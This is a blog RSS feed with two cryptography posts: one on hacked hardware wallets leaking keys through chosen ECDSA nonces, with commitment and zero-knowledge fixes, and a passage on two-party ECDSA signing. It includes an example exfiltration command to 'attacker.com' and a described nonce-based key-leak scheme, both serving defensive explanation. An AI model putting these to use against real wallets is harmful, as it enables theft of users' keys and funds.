<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>Stepan Snigirev &#8211; Specter Solutions | Your Keys, Your Bitcoin</title>
	<atom:link href="https://specter.solutions/author/stepan-snigirev/feed/" rel="self" type="application/rss+xml" />
	<link>https://specter.solutions</link>
	<description></description>
	<lastBuildDate>Tue, 19 Oct 2021 09:55:16 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=6.4.2</generator>

<image>
	<url>https://specter.solutions/wp-content/uploads/2020/12/cropped-1200px-Bitcoin.svg-32x32.png</url>
	<title>Stepan Snigirev &#8211; Specter Solutions | Your Keys, Your Bitcoin</title>
	<link>https://specter.solutions</link>
	<width>32</width>
	<height>32</height>
</image> 
	<item>
		<title>Hardware wallets can be hacked, but this is fine</title>
		<link>https://specter.solutions/hardware-wallets-can-be-hacked-but-this-is-fine/</link>
		
		<dc:creator><![CDATA[Stepan Snigirev]]></dc:creator>
		<pubDate>Sat, 05 Jan 2019 21:18:56 +0000</pubDate>
				<category><![CDATA[Bitcoin]]></category>
		<guid isPermaLink="false">https://specter.solutions/?p=3440</guid>

					<description><![CDATA[Here I describe how to live with it. In particular, how the attacker can encode our secrets in bitcoin signatures and how to fix it.]]></description>
										<content:encoded><![CDATA[		<div data-elementor-type="wp-post" data-elementor-id="3440" class="elementor elementor-3440">
						<div class="elementor-inner">
				<div class="elementor-section-wrap">
									<section class="elementor-section elementor-top-section elementor-element elementor-element-97342ab elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="97342ab" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
							<div class="elementor-row">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-ffa448b" data-id="ffa448b" data-element_type="column">
			<div class="elementor-column-wrap elementor-element-populated">
							<div class="elementor-widget-wrap">
						<div class="elementor-element elementor-element-0a9f6a1 elementor-widget elementor-widget-text-editor" data-id="0a9f6a1" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
								<div class="elementor-text-editor elementor-clearfix">
				<p id="4691" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">The recent <a class="ey hi" href="https://www.youtube.com/watch?v=Y1OBIGslgGM" target="_blank" rel="noopener nofollow">wallet.fail talk</a> on the 35c3 conference showed that even the best hardware wallets can be hacked. And if some wallet manufacturers claim that they are not vulnerable, I would think twice before trusting these statements.</p><p id="653d" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">In this post, I want to focus on supply channel attacks and how to use the hardware wallet even if it is compromised. Supply channel attacks are very appealing for hackers as they affect many devices at once and may not require any further interaction with the device by the attacker. Just ship and wait. Let’s discuss what the attacker can do and how we can stop him. We will start with very simple countermeasures and finally get to a pretty fancy one with some math involved.</p>					</div>
						</div>
				</div>
				<div class="elementor-element elementor-element-9549900 elementor-widget elementor-widget-image" data-id="9549900" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
								<div class="elementor-image">
									<figure class="wp-caption">
										<img fetchpriority="high" decoding="async" width="911" height="439" src="https://specter.solutions/wp-content/uploads/2021/01/1-4YfNTC3xL3emT_Gu7-1ayg.png" class="attachment-large size-large" alt="" srcset="https://specter.solutions/wp-content/uploads/2021/01/1-4YfNTC3xL3emT_Gu7-1ayg.png 911w, https://specter.solutions/wp-content/uploads/2021/01/1-4YfNTC3xL3emT_Gu7-1ayg-300x145.png 300w, https://specter.solutions/wp-content/uploads/2021/01/1-4YfNTC3xL3emT_Gu7-1ayg-768x370.png 768w, https://specter.solutions/wp-content/uploads/2021/01/1-4YfNTC3xL3emT_Gu7-1ayg-600x289.png 600w" sizes="(max-width: 911px) 100vw, 911px" />											<figcaption class="widget-image-caption wp-caption-text">Storing Bitcoins on a hacked hardware wallet? This is fine.</figcaption>
										</figure>
								</div>
						</div>
				</div>
				<div class="elementor-element elementor-element-c72e1aa elementor-widget elementor-widget-text-editor" data-id="c72e1aa" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
								<div class="elementor-text-editor elementor-clearfix">
				<div><div><p data-selectable-paragraph="">The ultimate goal of the attacker is to get our private keys. He can potentially replace the firmware of the device, replace the secure element with a malicious chip or include hardware implants to do Bad USB attacks or to send our private keys over the air.</p><p data-selectable-paragraph="">Mobile networks and SigFox are available almost everywhere and the attacker doesn’t need to be around to catch the signal. RF shielding can block all wireless implants — a metal bucket will do the job. There are also commercial products available for phones and other small devices. Looks too paranoid? Depends on the amount you own…</p></div></div>					</div>
						</div>
				</div>
				<div class="elementor-element elementor-element-f642601 elementor-widget elementor-widget-image" data-id="f642601" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
								<div class="elementor-image">
									<figure class="wp-caption">
										<img decoding="async" width="1024" height="282" src="https://specter.solutions/wp-content/uploads/2021/01/1-VB8odGWd62PgzHOzD2GG4w-1024x282.png" class="attachment-large size-large" alt="" srcset="https://specter.solutions/wp-content/uploads/2021/01/1-VB8odGWd62PgzHOzD2GG4w-1024x282.png 1024w, https://specter.solutions/wp-content/uploads/2021/01/1-VB8odGWd62PgzHOzD2GG4w-300x83.png 300w, https://specter.solutions/wp-content/uploads/2021/01/1-VB8odGWd62PgzHOzD2GG4w-768x211.png 768w, https://specter.solutions/wp-content/uploads/2021/01/1-VB8odGWd62PgzHOzD2GG4w-600x165.png 600w, https://specter.solutions/wp-content/uploads/2021/01/1-VB8odGWd62PgzHOzD2GG4w.png 1527w" sizes="(max-width: 1024px) 100vw, 1024px" />											<figcaption class="widget-image-caption wp-caption-text">RF shielding nano-tech</figcaption>
										</figure>
								</div>
						</div>
				</div>
				<div class="elementor-element elementor-element-e6462d2 elementor-widget elementor-widget-text-editor" data-id="e6462d2" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
								<div class="elementor-text-editor elementor-clearfix">
				<div><div><p data-selectable-paragraph="">Next, generating the private keys on a compromised device is a bad idea, so we should use our own source of entropy instead. We can use dices, coins or any other source of entropy. The best way is to use multiple entropy sources and XOR their outputs. It may be tricky to generate a valid mnemonic from the dices, but it’s doable.</p><p data-selectable-paragraph="">Also, plugging a potentially malicious device to the computer may cause problems. Even though a Bad USB attack is very limited, plugging in the device that can pretend to be a keyboard, start a terminal and run arbitrary code like <code>curl http://attacker.com/?pk=</code> is scary. So we should make our hardware wallet air-gaped. With ColdCard it’s simple — it is air-gapped by design. Trezor promises to implement this feature “in two weeks”. For any other device, we can use a dedicated air-gapped computer to connect the hardware wallet, sign a transaction there, save the signed transaction to SD card and move it to the online machine. And only then we double-check and broadcast the transaction to the network.</p><p data-selectable-paragraph="">Now, the only data passed from the hardware wallet to the outside world is our valid bitcoin transaction. Nothing could go wrong, right? Not quite…</p><h3 data-selectable-paragraph=""> </h3><h3 data-selectable-paragraph=""><b>Chosen nonce attack</b></h3><p data-selectable-paragraph="">Do you remember how we sign a bitcoin transaction? We take a hash of the transaction and calculate the signature:</p><p data-selectable-paragraph=""><strong><em>(r, s) = (r, (h+r⋅pk)/k)</em></strong></p><p data-selectable-paragraph="">Here <strong><em>pk</em></strong> is our private key, <strong><em>h</em></strong> is the hash of the transaction, <strong><em>k</em></strong> is a random or pseudorandom number and <strong><em>r</em></strong> is an <strong><em>x</em></strong>-coordinate of the public point <strong><em>R = k×G</em></strong>. And this pair <strong><em>(r, s)</em></strong> is the signature that we put into the transaction and broadcast to the network.</p><p data-selectable-paragraph="">As we blocked any other possibility for the hardware wallet to talk to the external world, its goal will be to generate a valid signature that leaks some information about our private keys. Then, the attacker can reconstruct the private keys by monitoring these transactions on the blockchain. The only way to do it is to generate a nonce <strong><em>k</em></strong> in a particular way.</p><p data-selectable-paragraph="">Ideally, the nonce <strong><em>k</em></strong> should be either chosen at random or deterministically derived from the message and the private key (there is a <a href="https://tools.ietf.org/html/rfc6979" target="_blank" rel="noopener nofollow">standard</a> for that). But when the hardware wallet is hacked, the attacker can choose any number he likes. And our computer can’t even check how this nonce was generated.</p><p data-selectable-paragraph="">Leaking a single private key in this scenario is extremely easy — the hacked wallet just uses a nonce that is known to the attacker. For example, the nonce can be derived by the same deterministic algorithm but using an attacker’s key instead of the user’s private key. Then the attacker can solve a single linear equation and get the private key from the <strong><em>s</em></strong> value of the signature:</p><p data-selectable-paragraph=""><strong><em>pk = (s⋅k – h)/r</em></strong></p><p data-selectable-paragraph="">I created a <a href="https://live.blockcypher.com/btc-testnet/tx/3d1647bf88c3a3036a10f6f9a0bd4a2015189b0d74a99bc513c505909d575dea/" target="_blank" rel="noopener nofollow">testnet transaction</a> to demonstrate this attack. The nonce is generated by the wallet according to the standard deterministic algorithm but instead of our private key, it uses attacker’s secret key (<code>0xf00dbabe</code>). We can easily extract the private key now and steal all the funds. A python notebook constructing this transaction and recovering the key is on <a href="https://github.com/stepansnigirev/chosen_nonce_demo/blob/master/single_key.ipynb" target="_blank" rel="noopener nofollow">GitHub</a>.</p></div></div>					</div>
						</div>
				</div>
				<div class="elementor-element elementor-element-cc0e5c7 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="cc0e5c7" data-element_type="widget" data-widget_type="divider.default">
				<div class="elementor-widget-container">
					<div class="elementor-divider">
			<span class="elementor-divider-separator">
						</span>
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-e87ad25 elementor-widget elementor-widget-text-editor" data-id="e87ad25" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
								<div class="elementor-text-editor elementor-clearfix">
				<p id="2bbe" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">This simple attack works only if we are re-using the same addresses. Nowadays we use HD wallets and when the transaction gets to the blockchain the spending address is already empty and the attacker gets a private key of an empty address. What we want instead is to get the <em class="kj">master private key</em>. The master private key is <a class="ey hi" href="https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki" target="_blank" rel="noopener nofollow">64 bytes long</a> and it is not directly involved in the signing equations. We need to find another way to leak it via nonces.</p><p id="fbf6" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">We are going to do the following: for every outgoing transaction we choose a nonce <strong class="gm ki"><em class="kj">k</em></strong> such that the number <strong class="gm ki"><em class="kj">r </em></strong>(<strong class="gm ki"><em class="kj">x</em></strong>-coordinate of the point <strong class="gm ki"><em class="kj">R=k×G</em></strong>) starts with an index <strong class="gm ki"><em class="kj">i</em></strong> followed by the corresponding byte of the master private key <strong class="gm ki">mpk[i]</strong>. Then the <strong class="gm ki"><em class="kj">r</em></strong> part of every signature will look like <strong class="gm ki"><em class="kj">01mpk[1]&lt;some random crap&gt;</em></strong>, <strong class="gm ki"><em class="kj">02mpk[2]&lt;other random crap&gt; </em></strong>and so on. To find <strong class="gm ki"><em class="kj">k</em></strong> giving us the right <strong class="gm ki"><em class="kj">r</em></strong> we need to try a few times. On every try we increase <strong class="gm ki"><em class="kj">k </em></strong>by 1 and add G to the corresponding point <strong class="gm ki"><em class="kj">R</em></strong>. As addition is much faster than multiplication we can find a correct nonce pretty quickly — the user may not even notice. And roughly after ~64 transactions, we will be able to reconstruct the full master private key. To add some privacy for the attacker we can find nonces that start not with <strong class="gm ki"><em class="kj">i mkp[i]</em></strong> but with a XOR of this with the attaker’s key: <strong class="gm ki"><em class="kj">i mpk[i] </em></strong>⊕<strong class="gm ki"><em class="kj"> attacker_key</em></strong>. Then only the attacker can reconstruct the key and the signatures don’t look suspicious.</p><p id="bfb6" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">Finding all transactions corresponding to the same wallet is not very hard — normally all transactions from the same HD wallet can be linked to each other, especially when we know what to expect in the first bytes of the signature.</p><p id="3ad4" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">To demo this attack I created a set of bitcoin transactions on the testnet starting from <a class="ey hi" href="https://live.blockcypher.com/btc-testnet/tx/5795b9ab35c0bc10f39f3d9a10193d3511225d17d89f36890f7adb8b7af440c7/" target="_blank" rel="noopener nofollow">this</a> to <a class="ey hi" href="https://live.blockcypher.com/btc-testnet/tx/dd39e8dbb028977829f5250725c66bd7370a1f2d8444819735dd7ead02b7557d/" target="_blank" rel="noopener nofollow">this</a>. I used 0x00 as an attacker’s key so anyone can see the bytes of the master private key in the nonces of the signatures:</p>					</div>
						</div>
				</div>
				<div class="elementor-element elementor-element-a550b55 elementor-widget elementor-widget-html" data-id="a550b55" data-element_type="widget" data-widget_type="html.default">
				<div class="elementor-widget-container">
			<pre>
<code>
tx 0:  r = 0057360015b25dc6ec...
tx 1:  r = 016d24c28dff49f70f...
...
tx 63: r = 3f94476a5630120121...
</code>
</pre>		</div>
				</div>
				<div class="elementor-element elementor-element-2483499 elementor-widget elementor-widget-text-editor" data-id="2483499" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
								<div class="elementor-text-editor elementor-clearfix">
				<p>And we can easily reconstruct the master private key of the attacked wallet — <code>576d...94</code> . Full code is also on <a href="https://github.com/stepansnigirev/chosen_nonce_demo/blob/master/HD_key.ipynb" target="_blank" rel="noopener nofollow">GitHub</a>.</p><p>Now the question is, can we fix it somehow? There are two ways. Both<br />have certain pros and cons. The core problem in the current protocol is<br />that we allow the hardware wallet to <em>choose a value that will be directly encoded in the transaction</em>.<br />We need to take this freedom away either by forcing the hardware wallet<br />to use a certain algorithm or by randomizing its choice using<br />additional offset.</p><h3 data-selectable-paragraph=""> </h3><h3 data-selectable-paragraph=""><b>Fix 1. Commitments.</b></h3><p data-selectable-paragraph="">First,<br />let’s talk about randomization. We allow the hardware wallet to choose a<br />nonce however it wants, but then we fix this choice by asking for a<br />commitment and provide an additional random number for an offset.<br />Hardware wallet then has to add this number to its nonce and use their<br />sum in the signature scheme. In this situation, if one of the devices is<br />behaving properly, the resulting nonce is random and it can’t contain<br />any additional information.</p><p data-selectable-paragraph="">To be more precise we require the following procedure:</p><ul><li data-selectable-paragraph="">the hardware wallet chooses a random number <strong><em>k1 </em></strong>and commits to it by disclosing a corresponding point <strong><em>R1 = k1×G</em></strong></li><li data-selectable-paragraph="">the computer sends unsigned transaction data and another random number <strong><em>k2</em></strong> to the hardware wallet</li><li data-selectable-paragraph="">the hardware wallet signs the transaction using the nonce <strong><em>k=k1+k2</em></strong></li><li data-selectable-paragraph="">the computer verifies that the signature and the transaction are valid and that <strong><em>r</em></strong> part of the signature is an <strong><em>x</em></strong>-coordinate of the point <strong><em>R=k×G=R1+k2×G</em></strong>, where <strong><em>R1</em></strong> is a point the hardware wallet committed to in the beginning.</li></ul><p data-selectable-paragraph="">This<br />way our computer checks that the hardware wallet used the nonce it<br />committed to and added an offset that we provided. There are two<br />drawbacks in this scheme:</p><ul><li data-selectable-paragraph="">the<br />protocol requires several communication rounds, so with an air-gapped<br />hardware wallet, we will need to move between the computer and the<br />hardware wallet twice. Or we take two SD cards (one for the commitment<br />and another one for the second random number and signed transaction).</li><li data-selectable-paragraph="">the hardware wallet can’t use deterministic <strong><em>k</em></strong><br />anymore, it has to use truly random numbers from hardware RNG. And<br />usually RNG = problems. The reason to use RNG is that if the computer<br />will ask the wallet to sign the same transaction <em>twice</em> and provide <em>two different</em> numbers <strong><em>k2</em></strong>, <strong><em>k2&#8242;</em></strong>, usage of the deterministic <strong><em>k1</em></strong> will immediately reveal the secret key.</li></ul><p data-selectable-paragraph="">In total, this protocol is very easy to implement, but it is less convenient and may require a good source of randomness on the hardware wallet.</p><blockquote class="kz la lb"><p id="acd9" class="gk gl kj gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph=""><strong class="gm ki">Update</strong>: We can still use deterministic <strong class="gm ki">k</strong> generation if the computer commits to its <strong class="gm ki">k2</strong> and the hardware wallet uses this commitment to derive its <strong class="gm ki">k1</strong>. The whole communication process will look like this:</p><p id="2ffd" class="gk gl kj gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">• the computer chooses some value <strong class="gm ki">k2</strong>. Then it sends to the hardware wallet an unsigned transaction together with the commitment <strong class="gm ki">c=sha256(k2)</strong><em class="dn">.</em></p><p id="4b48" class="gk gl kj gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">• the hardware wallet deterministically calculates a nonce <strong class="gm ki">k1</strong> from the transaction, the private key and the computer’s commitment <strong class="gm ki"><em class="dn">c</em></strong>. Then the hardware wallet commits to this nonce by revealing <strong class="gm ki">R1=k1×G</strong> to the computer.</p><p id="fd4a" class="gk gl kj gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">• the computer sends its nonce <strong class="gm ki">k2</strong> to the hardware wallet.</p><p id="0c90" class="gk gl kj gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">• the hardware wallet checks that the nonce <strong class="gm ki">k2</strong> hashes to the value <strong class="gm ki">c</strong> and signs the transaction using the nonce <strong class="gm ki">k=k1+k2</strong>.</p><p id="2203" class="gk gl kj gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">• the computer verifies that the signature and the transaction are valid and that <strong class="gm ki">r</strong> part of the signature is an <strong class="gm ki">x</strong>-coordinate of the point <strong class="gm ki">R=k×G=R1+k2×G</strong>.</p><p id="ef14" class="gk gl kj gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">• now it’s safe to broadcast the transaction</p><p id="a33b" class="gk gl kj gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">Thanks to <a class="ey hi" href="https://twitter.com/n1ckler" target="_blank" rel="noopener nofollow">@n1ckler</a> for bringing this up. There is also a <a class="ey hi" href="https://github.com/bitcoin-core/secp256k1/pull/572" target="_blank" rel="noopener nofollow">pull request</a> to bitcoin core implementing this feature. And using this protocol with an airgapped wallet is not that painful — we can use two SD cards to sign the transaction. The first one will contain an unsigned transaction, a commitment <strong class="gm ki">c=sha256(k2)</strong> from the computer and later a commitment <strong class="gm ki">R1</strong> from the hardware wallet. The second one will contain the nonce <strong class="gm ki">k2</strong> and later a signed transaction from the hardware wallet.</p></blockquote><p> </p><h3><b>Fix 2. Zero-knowledge proofs</b></h3><p>Another option is to force the hardware wallet to use a particular algorithm to generate the nonce and to require a zero-knowledge proof of that. The current standard (RFC6979) uses SHA256 to derive a deterministic nonce from the message and the private key, but the corresponding zero-knowledge proof is extremely hard to calculate. Especially for a hardware wallet.</p><p>If you don’t know how zero-knowledge proofs work there is a very nice post by Vitalik Buterin on that (also check the references). Without going into details, zero-knowledge proofs are pretty tolerant to linear operations but blow up in size and complexity as soon as you add multiplications and other non-linear operations. Unfortunately, common hashing algorithms are very non-linear. Roughly speaking, calculating a ZK proof of SHA256 will be as difficult as calculating 10000 signatures. For a hardware wallet, it could take several minutes to generate a proof. Not very usable.</p><p>Fortunately, there are other hashing algorithms that are more ZK-friendly. In particular, MiMC hashing algorithm was specifically designed to be used with ZK proofs. We can tailor the deterministic nonce generation algorithm to use MiMC instead of SHA256. With MiMC the hardware wallet will be able to generate a proof in 20 seconds instead of several minutes. Then we can require the hardware wallet to include a ZK prove that this particular deterministic algorithm was used to generate a nonce for every signature. And therefore we can be sure that no data leak is possible. Hardware wallet doesn’t have any choice now. Everything is deterministic and provable.</p><p>There are two minor problems with this protocol:</p><ul><li>MiMC is a pretty new hashing algorithm (2016), and we should make sure it is safe to use before deploying it in a real application. In particular, we need to be sure that it is not biased, uniformly distributed and blah blah blah.</li><li>ZK proofs are memory and computationally intensive. Especially when we talk about low performance embedded devices like 180MHz microcontrollers used in hardware wallets. And they are also theoretically complicated… They are pretty hard to understand and implement correctly. But still, doable.</li></ul><h3> </h3><h3><b>Conclusion</b></h3><p>It would be nice to see these or similar signing protocols realized in hardware and software wallets. I would definitely use it if I could. I believe we need to improve the security of our bitcoin storage setups and remove trust in manufacturers of our wallet software and firmware. We can’t read all the code we use, but we can verify that the protocol is used correctly.</p><p>I really like a phrase I’ve heard in quantum cryptography field: a good cryptographic setup can be verified and used for secure communication even if it was manufactured by an attacker. I would really like to get to the same level of confidence with our bitcoin setups.</p><p>And yeah, don’t forget to use your metal bucket and a foil cap!</p>					</div>
						</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
									</div>
			</div>
					</div>
		]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>ECDSA is not that bad: two-party signing without Schnorr or BLS</title>
		<link>https://specter.solutions/ecdsa-is-not-that-bad-two-party-signing-without-schnorr-or-bls/</link>
		
		<dc:creator><![CDATA[Stepan Snigirev]]></dc:creator>
		<pubDate>Sun, 14 Oct 2018 19:40:26 +0000</pubDate>
				<category><![CDATA[Bitcoin]]></category>
		<category><![CDATA[Cryptography]]></category>
		<category><![CDATA[Math]]></category>
		<guid isPermaLink="false">https://specter.solutions/?p=3583</guid>

					<description><![CDATA[I already wrote about Schnorr and BLS signatures and I think they are really great. One of the most exciting properties of these signature schemes is key aggregation — if we want to make a 2-of-2 multisignature address we just take our public keys and add them together. The signature will be also just a &#8230;<p class="read-more"> <a class="" href="https://specter.solutions/ecdsa-is-not-that-bad-two-party-signing-without-schnorr-or-bls/"> <span class="screen-reader-text">ECDSA is not that bad: two-party signing without Schnorr or BLS</span> Read More &#187;</a></p>]]></description>
										<content:encoded><![CDATA[		<div data-elementor-type="wp-post" data-elementor-id="3583" class="elementor elementor-3583">
						<div class="elementor-inner">
				<div class="elementor-section-wrap">
									<section class="elementor-section elementor-top-section elementor-element elementor-element-ea6e40b elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="ea6e40b" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
							<div class="elementor-row">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-ae9203c" data-id="ae9203c" data-element_type="column">
			<div class="elementor-column-wrap elementor-element-populated">
							<div class="elementor-widget-wrap">
						<div class="elementor-element elementor-element-6744e86 elementor-widget elementor-widget-text-editor" data-id="6744e86" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
								<div class="elementor-text-editor elementor-clearfix">
				<p data-selectable-paragraph="">I already wrote about <a href="https://medium.com/@snigirev.stepan/how-schnorr-signatures-may-improve-bitcoin-91655bcb4744" target="_blank" rel="noopener">Schnorr</a> and <a href="https://medium.com/@snigirev.stepan/bls-signatures-better-than-schnorr-5a7fe30ea716" target="_blank" rel="noopener">BLS</a> signatures and I think they are really great. One of the most exciting properties of these signature schemes is <em>key aggregation</em> — if we want to make a 2-of-2 multisignature address we just take our public keys and add them together. The signature will be also just a sum of two signatures. This is possible because both Schnorr and BLS are linear — the sum of the verification equations is also a valid equation.</p><p data-selectable-paragraph="">For example, to verify Schnorr signature <strong><em>(R, s) = (k×G, k+hash(P,R,m)⋅pk) </em></strong>we need to confirm that <strong><em>s×G = R + hash(P,R,m)×P</em></strong>. This means that if we use two private keys <strong><em>pk1, pk2 </em></strong>with corresponding public keys <strong><em>P1=pk1×G</em></strong>, <strong><em>P2=pk2×G</em></strong> we can add them up to get a multisig key <strong><em>P = P1+P2</em></strong>. And to generate a multisignature we just add our random numbers and signatures: <strong><em>(R, s) = (R1+R2, s1+s2)</em></strong>. We only need to agree on <strong><em>R=R1+R2</em></strong> in advance as it is used in the hash of the message. If the equations above look confusing to you, check out my <a href="https://medium.com/@snigirev.stepan/how-schnorr-signatures-may-improve-bitcoin-91655bcb4744" target="_blank" rel="noopener">previous post on Schnorr signatures</a>.</p><p data-selectable-paragraph="">With <a href="https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm" target="_blank" rel="noopener nofollow">ECDSA</a> everything is a bit more complicated. The verification equation is not linear. To generate a signature we need to choose a random number <strong><em>k</em></strong> with corresponding point <strong><em>R = k×G</em></strong> and compute <strong><em>s = (z+r⋅pk)/k</em></strong>. Here <strong><em>z=hash(m) </em></strong>is the hash of the message we are signing and <strong><em>r</em></strong> is an <strong><em>x-</em></strong>coordiante of our random point <strong><em>R</em></strong>. Annoying part here is this division by <strong><em>k</em></strong>. A simple addition of the equations doesn’t work anymore. But multiplication does! We just need to be careful with it. There is a nice trick shown in the <a href="https://eprint.iacr.org/2017/552.pdf" target="_blank" rel="noopener nofollow">paper</a> by Yehuda Lindell that allows us to do 2-party ECDSA and generate a common signature.</p><h3 data-selectable-paragraph=""> </h3><h3 data-selectable-paragraph=""><b>2-party ECDSA at a glance</b></h3><p data-selectable-paragraph="">To make key aggregation work with ECDSA we need to use multiplication instead of addition. From two private keys <strong><em>pk1, pk2</em></strong> and corresponding public keys <strong><em>P1=pk1×G</em></strong>, <strong><em>P2=pk2×G</em></strong> we calculate an aggregated public key <strong><em>P=pk1×P2=pk2×P1=pk1⋅pk2×G</em></strong>. This is a standard <a href="https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange" target="_blank" rel="noopener nofollow">Diffie-Helman key exchange</a> — every party takes the public key of another party and multiplies it by his private key. Now both parties know the common public key without exposing anything about their private keys.</p><p data-selectable-paragraph="">To generate a valid signature for the message <strong><em>m</em></strong> with hash <strong><em>z=hash(m)</em></strong> we need to generate two random numbers <strong><em>k1, k2 </em></strong>(one for every party) and then calculate somehow the signature <strong><em>(r, s)</em></strong>. Calculating <strong><em>r</em></strong> is easy — we do the same Diffie-Helman key exchange. Parties send each other their random points <strong><em>R1=k1×G</em></strong>,<strong><em> R2=k2×G</em></strong> and calculate common point <strong><em>R=k1×R2=k2×R1=k1⋅k2×G</em></strong>. The part with <strong><em>s</em></strong> is much more complicated — we need to compute <strong><em>s=(z+r⋅pk1⋅pk2)/k1/k2</em></strong> in such a way that private key and random number of one party stay unknown to another.</p><p data-selectable-paragraph="">For this purpose, we can use <a href="https://en.wikipedia.org/wiki/Homomorphic_encryption" target="_blank" rel="noopener nofollow">homomorphic encryption</a>, in particular, <a href="https://en.wikipedia.org/wiki/Paillier_cryptosystem" target="_blank" rel="noopener nofollow">Paillier scheme</a>. Homomorphic encryption is a wonderful tool — with it, we can do computations on the encrypted data without getting any knowledge of the data itself. I will explain how it works a bit later and for now try to imagine: we can send an encrypted secret to another party and he can add something to it, multiply it by some number and then return us the result without getting any information about what he just did. Sounds magical! And it really is. Modern cryptography is so exciting!</p><p data-selectable-paragraph="">To calculate our common signature we need to do the following: the first party encrypts his private key <strong><em>pk1</em></strong> and sends the encrypted value <strong><em>e(pk1)</em></strong> to another party. The second party, using this encrypted key, creates a partial signature <strong><em>s’=(z+r⋅e(pk1)⋅pk2)/k2</em></strong> and sends it back to the first party. As the private key of the first party is encrypted, the second party learns nothing about it. And as the second party uses both his private key <strong><em>pk2</em></strong> and his random number <strong><em>k2</em></strong>, the first party also learns nothing. Now, the first party can decrypt the returned value and divide it by <strong><em>k1</em></strong>. Finally, we get our signature <strong><em>s=(z+r⋅pk1⋅pk2)/k2/k1</em></strong>.</p>					</div>
						</div>
				</div>
				<div class="elementor-element elementor-element-2069372 elementor-widget elementor-widget-image" data-id="2069372" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
								<div class="elementor-image">
									<figure class="wp-caption">
										<img decoding="async" width="895" height="1024" src="https://specter.solutions/wp-content/uploads/2021/01/1-4oJV59a7EMNgiKrbGtWhrA@2x-895x1024.png" class="attachment-large size-large" alt="" srcset="https://specter.solutions/wp-content/uploads/2021/01/1-4oJV59a7EMNgiKrbGtWhrA@2x-895x1024.png 895w, https://specter.solutions/wp-content/uploads/2021/01/1-4oJV59a7EMNgiKrbGtWhrA@2x-262x300.png 262w, https://specter.solutions/wp-content/uploads/2021/01/1-4oJV59a7EMNgiKrbGtWhrA@2x-768x879.png 768w, https://specter.solutions/wp-content/uploads/2021/01/1-4oJV59a7EMNgiKrbGtWhrA@2x-1342x1536.png 1342w, https://specter.solutions/wp-content/uploads/2021/01/1-4oJV59a7EMNgiKrbGtWhrA@2x-600x687.png 600w, https://specter.solutions/wp-content/uploads/2021/01/1-4oJV59a7EMNgiKrbGtWhrA@2x.png 1400w" sizes="(max-width: 895px) 100vw, 895px" />											<figcaption class="widget-image-caption wp-caption-text">Simplified diagram of 2-party ECDSA signing. Blue values are public points, red values are secret, orange text represents homomorphic encryption and decryption.</figcaption>
										</figure>
								</div>
						</div>
				</div>
				<div class="elementor-element elementor-element-fefa590 elementor-widget elementor-widget-text-editor" data-id="fefa590" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
								<div class="elementor-text-editor elementor-clearfix">
